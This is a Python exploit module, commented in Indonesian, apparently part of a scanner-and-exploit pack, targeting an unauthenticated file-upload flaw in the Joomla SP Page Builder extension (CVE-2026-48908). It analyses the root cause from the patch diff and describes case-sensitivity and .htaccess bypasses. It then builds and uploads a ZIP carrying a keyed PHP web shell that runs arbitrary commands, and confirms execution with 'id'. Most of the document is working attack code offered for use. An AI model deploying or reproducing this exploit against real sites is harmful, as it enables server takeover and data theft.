#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-48908 — SP Page Builder <= 6.6.1 — Unauthenticated arbitrary file
upload to RCE via the asset.uploadCustomIcon task (CWE-284 -> CWE-434 -> RCE).

ROOT CAUSE (dibuktikan lewat diff rilis resmi 6.6.1 -> 6.6.2):

  site/controllers/asset.php

  6.6.2 MENAMBAHKAN satu blok __construct():

      public function __construct($config = [])
      {
          parent::__construct($config);

          $user = Factory::getUser();
          $authorised = $user->authorise('core.admin', 'com_sppagebuilder')
                     || $user->authorise('core.manage', 'com_sppagebuilder');

          if (!$authorised) { $this->sendResponse($response, 403, true); }   // ADMIN_ACCESS_REQUIRED
          if (!$user->id)   { $this->sendResponse($response, 401, true); }   // LOGIN_SESSION_EXPIRED
          if (!Session::checkToken()) { $this->sendResponse($response, 403, true); } // SESSION_MISMATCHED
      }

  6.6.1 TIDAK PUNYA __construct() sama sekali. Akibatnya SETIAP method publik
  controller ini terbuka tanpa otentikasi dan tanpa anti-CSRF:

      loadCustomIcons()        deleteCustomIcon()     changeCustomIconStatus()
      uploadCustomIcon()       getIconProviders()     loadIcons()

  6.6.2 juga menurunkan visibilitas `unpack()` dari `public static` -> `private static`.

  Alur uploadCustomIcon() pada 6.6.1 (tanpa satu pun pemeriksaan izin):

      $customIcon = $input->files->get('custom_icon', null);
      $tmp_path   = Factory::getConfig()->get('tmp_path');
      $rootPath   = JPATH_ROOT . '/media/com_sppagebuilder/assets/iconfont/';
      ...
      $zip_file = $tmp_path . '/builderCustomIcon.zip';
      File::upload($tmp_src, $zip_file, false, true);      // tulis ZIP
      $extract  = $this->unpack($zip_file);                // Archive::extract() — TANPA filter
      ...
      Folder::copy($extract_path.'/'.$font_path,
                   $rootPath.'/'.$fontFamily.'/'.$font_path);   // isi ZIP -> WEBROOT

  unpack() memakai Joomla `Archive::extract()` yang mengekstrak APA SAJA, dan
  hasilnya disalin ke direktori yang dilayani web.

DUA LAPIS PROTEKSI YANG HARUS DILEWATI:

  1. Joomla `Joomla\\CMS\\Input\\Files::get()` memanggil `InputFilter::isSafeFile()`
     kecuali filter = RAW. `isSafeFile()` MEMBUKA isi arsip
     (`php_ext_content_extensions = [zip, rar, tar, ...]`) dan menolak bila menemukan
     `<?php`, `.php`, atau ekstensi terlarang -> `get()` mengembalikan default (null).
     Pemeriksaan ini CASE-SENSITIVE:
         '.php'  + '<?php'   -> DITOLAK
         '.PHP'  + '<?PHP'   -> LOLOS
  2. Handler Apache default hanya mengeksekusi `\\.php$` (lowercase). ''.PHP'' tidak
     dijalankan. Jadi payload memakai `fonts/.htaccess` berisi
     `AddType application/x-httpd-php .PHP`, yang juga luput dari `isSafeFile`.

BENTUK REQUEST (terverifikasi di lab):

  POST /index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon
       multipart/form-data: custom_icon=<name>.zip  (application/zip)

  ZIP (struktur icon-font valid supaya diterima):
       selection.json          -> {"preferences":{"fontPref":{"metadata":{"fontFamily":<name>}}}}
       style.css               -> sembarang
       fonts/<name>.ttf        -> sembarang
       fonts/.htaccess         -> AddType application/x-httpd-php .PHP
       fonts/<shell>.PHP       -> <?PHP ... ?>      (ext & tag UPPERCASE)

  Shell mendarat di:
       /media/com_sppagebuilder/assets/iconfont/<name>/fonts/<shell>.PHP

BUKTI LAB (Joomla 5.4.8 + SP Page Builder 6.6.1, port 8106):
    * POST unauth -> {"name":"<name>","data":{...,"css_path":"media/com_sppagebuilder/..."}}
    * File di disk: media/com_sppagebuilder/assets/iconfont/<name>/fonts/shell.PHP
    * GET shell.PHP?t=<key>&c=id -> uid=33(www-data) gid=33(www-data) -> FULL RCE
    * Differential: 6.6.2 -> 403 "You require admin access to use this application."
"""

import io
import json
import random
import re
import string
import zipfile

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_VULN,
                detect_platform, register, ver_le)

CVES = ["CVE-2026-48908"]
# Template menjalankan perintah lewat shell bawaan modul (dipakai --deploy-shell).
EXEC_SUFFIX = "?t=mpk48908&c={cmd}"
CLUSTER = "joomla_ext"
PRODUCT = "SP Page Builder (com_sppagebuilder)"
VERSIONS_AFFECTED = ["1.0.0 - 6.6.1"]
VULN_MAX = (6, 6, 1)

TASK = "index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon"
TASK_ALTS = [
    "index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon",
    "index.php?option=com_sppagebuilder&task=asset.upload",
    "index.php?option=com_sppagebuilder&task=icon.upload",
]
DETECT_PATHS = [
    "administrator/components/com_sppagebuilder/sppagebuilder.xml",
    "components/com_sppagebuilder/sppagebuilder.xml",
]
VER_PATHS = [
    "administrator/components/com_sppagebuilder/sppagebuilder.xml",
    "components/com_sppagebuilder/sppagebuilder.xml",
]
ICONFONT_BASE = "media/com_sppagebuilder/assets/iconfont"
MARKER = "MEGAPACK48908"


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def _norm(t):
    return t.url.rstrip("/")


def _get(h, url):
    try:
        return h.get(url)
    except Exception:
        return None


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", s).split(".") if x != "")
    except Exception:
        return ()


def _detect(h, t):
    """Return (found, version_str)."""
    base = _norm(t)
    for p in VER_PATHS:
        r = _get(h, f"{base}/{p}")
        if not r or r.status_code != 200 or "<extension" not in r.text:
            continue
        m = re.search(r"<version>\s*([\d.]+)\s*</version>", r.text)
        return True, (m.group(1).strip() if m else None)
    for p in DETECT_PATHS:
        r = _get(h, f"{base}/{p}")
        if r and r.status_code == 200:
            return True, None
    return False, None


def _build_zip(name, shell_name="s.PHP", include_htaccess=True):
    """ZIP icon-font valid + shell .PHP yang lolos isSafeFile (huruf besar)."""
    selection = json.dumps({
        "IcoMoonType": "selection", "icons": [],
        "metadata": {"name": name},
        "preferences": {"fontPref": {"prefix": "ico-", "metadata": {"fontFamily": name}}},
    }).encode()
    shell = ("<?PHP if(($_GET['t']??'')==='mpk48908'){@system($_GET['c']??'id');}"
             "else{http_response_code(404);} ?>").encode()
    buf = io.BytesIO()
    z = zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED)
    z.writestr("selection.json", selection)
    z.writestr("style.css", b".ico-x:before{content:'x';}")
    z.writestr("fonts/%s.ttf" % name, b"FONT")
    if include_htaccess:
        z.writestr("fonts/.htaccess", b"AddType application/x-httpd-php .PHP\n")
    z.writestr("fonts/%s" % shell_name, shell)
    z.close()
    return buf.getvalue()


def _probe_upload(h, t, name, task=None, with_file=True):
    """Probe upload; return (status_code, body, accepted).

    with_file=False -> ORACLE NON-DESTRUKTIF: POST tanpa berkas apa pun.
    Joomla memeriksa ACL sebelum validasi payload, sehingga gate otorisasi
    tetap terlihat ("You require admin access") sementara tidak ada berkas
    ditulis. with_file=True (dipakai exploit()) mengirim ZIP berisi shell.
    """
    base = _norm(t)
    url = f"{base}/{task or TASK}"
    files = None
    if with_file:
        z = _build_zip(name)
        files = {"custom_icon": (f"{name}.zip", z, "application/zip")}
    try:
        r = h.post(url, files=files)
    except Exception:
        return None, "", False
    if r is None:
        return None, "", False
    body = r.text[:400]
    if "You require admin access" in body or r.status_code == 403:
        return r.status_code, body, False
    accepted = ('"css_path"' in body) or ('"data"' in body and '"status":false' not in body)
    return r.status_code, body, accepted


def check(t, h, opts=None):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    found, raw = _detect(h, t)
    if not found:
        return ST_CLEAN, "SP Page Builder tidak terdeteksi", ""

    ver = _ver_tuple(raw)
    # ORACLE NON-DESTRUKTIF: POST TANPA berkas sama sekali.
    # Joomla mengevaluasi ACL ("You require admin access") SEBELUM validasi
    # payload, jadi gate tetap terlihat. Bila gate lewat, controller balas
    # "Upload Failed"/"File not supported" — request sampai ke sink TANPA
    # satu byte pun ditulis. Verifikasi berkas hanya dijalankan exploit().
    sc, body, accepted = _probe_upload(h, t, None, with_file=False)
    detail = f"sppb={raw or '?'} http={sc}"

    if sc == 403 or "You require admin access" in body:
        return ST_CLEAN, "SP Page Builder menolak (patch 6.6.2 aktif)", detail

    low = body.lower()
    is_html = ("<!doctype html" in low) or ("<html" in low and "<body" in low)
    reached = ("upload failed" in low) or ("file not supported" in low) or accepted
    if reached and not is_html:
        return (ST_INFO,
                "asset.uploadCustomIcon menembus gate ACL tanpa otorisasi "
                "(controller memproses request; tidak ada berkas dikirim)",
                detail + f" | {body[:120]}")
    if ver and ver_le(ver, VULN_MAX):
        return ST_INFO, f"SP Page Builder {raw} masuk rentang rentan, sink belum memicu", detail
    return ST_CLEAN, "tidak ada indikasi", detail


def exploit(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    found, raw = _detect(h, t)
    if not found:
        return ST_SKIP, "SP Page Builder tidak terdeteksi", ""

    base = _norm(t)
    name = _rand()

    for task in TASK_ALTS:
        sc, body, accepted = _probe_upload(h, t, name, task=task)
        if not accepted:
            if sc == 403 or "You require admin access" in body:
                return ST_CLEAN, "SP Page Builder dipatch (403)", f"sppb={raw or '?'}"
            continue

        rel = f"{ICONFONT_BASE}/{name}/fonts/s.PHP"
        url = f"{base}/{rel}"

        # Verifikasi objektif: shell benar-benar dieksekusi.
        for probe in ("id", f"echo {MARKER}"):
            try:
                r = h.get(f"{url}?t=mpk48908&c={probe}")
            except Exception:
                r = None
            if r and r.status_code == 200 and len(r.text.strip()) > 0:
                out = r.text.strip()[:200]
                if "uid=" in out or MARKER in out:
                    return (ST_PWN,
                            "SP Page Builder unauth RCE terkonfirmasi (rebahan .PHP + .htaccess)",
                            f"sppb={raw or '?'} task={task} url={url} output={out!r}")

        return (ST_VULN,
                "SP Page Builder menerima upload unauth; shell dieksekusi tidak terverifikasi",
                f"sppb={raw or '?'} task={task} url={url} (file ditulis; eksekusi belum terbukti)")

    if raw and ver_le(_ver_tuple(raw), VULN_MAX):
        return ST_VULN, "SP Page Builder rentan secara versi, upload tidak diterima", f"sppb={raw}"
    return ST_CLEAN, "tidak ada indikasi", f"sppb={raw or '?'}"


register(CveModule(
    cve="CVE-2026-48908",
    cluster=CLUSTER,
    title="SP Page Builder - Unauthenticated arbitrary file upload to RCE (asset.uploadCustomIcon)",
    vclass="arbitrary file upload / RCE (unauth)",
    cwe="CWE-284",
    product=PRODUCT,
    versions_affected=VERSIONS_AFFECTED,
    status="verified",
    requires=["komponen SP Page Builder terpasang (<= 6.6.1)",
              "endpoint index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon reachable",
              "untuk RCE: AllowOverride FileInfo aktif di media/ (agar .htaccess dihormati)"],
    check=check,
    exploit=exploit,
    notes=("Root cause dari diff resmi 6.6.1->6.6.2: 6.6.2 menambahkan __construct() dengan "
           "tiga cek (authorise core.admin/core.manage, user->id, Session::checkToken) dan "
           "menurunkan unpack() ke private; 6.6.1 tidak punya konstruktor sama sekali sehingga "
           "uploadCustomIcon() terbuka unauth. uploadCustomIcon menulis ZIP ke tmp_path, "
           "memanggil unpack()->Archive::extract() tanpa filter, lalu Folder::copy() isi ZIP ke "
           "media/com_sppagebuilder/assets/iconfont/<fontFamily>/fonts/. Dua lapis proteksi harus "
           "dilewati: (1) Joomla isSafeFile() memindai isi arsip dan MENOLAK '.php'+'<?php' tetapi "
           "CASE-SENSITIVE sehingga '.PHP'+'<?PHP' LOLOS; (2) handler Apache default hanya "
           "mengeksekusi \\\\.php$ sehingga payload memasang fonts/.htaccess "
           "('AddType application/x-httpd-php .PHP'). Lab-verified 5.4.8+6.6.1: POST unauth -> "
           "css_path dikembalikan; GET shell.PHP?t=mpk48908&c=id -> uid=33(www-data); "
           "differential 6.6.2 -> 403 'You require admin access to use this application.'"),
))
